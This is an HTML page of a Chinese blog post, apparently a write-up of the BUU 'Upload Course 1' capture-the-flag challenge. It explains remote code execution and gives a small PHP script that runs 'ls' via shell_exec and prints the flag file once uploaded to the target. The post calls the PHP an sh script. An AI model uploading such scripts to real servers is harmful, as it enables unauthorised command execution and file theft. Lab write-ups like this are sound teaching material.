@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xuan tu">
+
+
+
+
+
+
+
+<title>BUU UPLOAD COURSE 1 1 解题记录 | 曲径通幽处.</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            ヾ(^_^) back Home.!!
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">主页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">文章</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a target="_blank" rel="noopener" href="https://drive.google.com/drive/folders/1a-OiD9e0tEgNmWDoR0RGkhBtp-v8TQq8?usp=drive_link">图书馆(M)</a>
+              </li> 
+                   
+          
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
+        </div>
+        <div class="post-title">
+            
+            
+                BUU UPLOAD COURSE 1 1 解题记录
+            
+            
+        </div>
+        <span class="post-date">
+            7月 19, 2023
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <p><strong>本题利用的是：</strong></p>
+<h2 id="RCE漏洞"><a href="#RCE漏洞" class="headerlink" title="RCE漏洞"></a>RCE漏洞</h2><p>远程代码执行漏洞（RCE）是一种软件安全漏洞，允许攻击者在受害计算机上执行任意代码。攻击者可以利用此漏洞控制受害计算机，窃取数据，或植入恶意软件。</p>
+<p>RCE漏洞可能存在于各种软件中，包括Web应用程序、操作系统和应用程序服务器。攻击者可以利用各种方法来利用RCE漏洞，包括：</p>
+<ul>
+<li>发送恶意链接或文件给受害者</li>
+<li>利用未经身份验证的访问</li>
+<li>利用软件中的错误或漏洞</li>
+</ul>
+<p>写一个sh脚本：</p>
+<p>（sh脚本：Linux系统的运行脚本）</p>
+<p>内容：（这个sh脚本虽然是php的语法，但是仍然可以运行）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回根目录</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行ls命令</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印命令的输出</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取flag文件</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印flag文件的内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将这个脚本上传</p>
+<p>虽然显示上传了了jpg文件，但是你的sh脚本里面的内容仍然是执行了的，访问该文件的地址即可得到flag：</p>
+<p><img src="https://img1.imgtp.com/2023/07/19/11pVZAmm.png"></p>
+
+</div> 
+
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2023/07/19/sql%201/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+     
+
+     
+
+
+    
+       <!--PC版-->
+        <div id="SOHUCS" ></div>
+        <script charset="utf-8" type="text/javascript" src="https://cy-cdn.kuaizhan.com/upload/changyan.js" ></script>
+        <script type="text/javascript">
+        window.changyan.api.config({
+            appid: 'cywJvGKKO',
+            conf: 'prod_dfd0ec91693832034dcc62943592b045'
+        });
+        </script>   
+     
+
+</div>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                
+                <br>
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+    
+    
+
+  </body>
+</html>
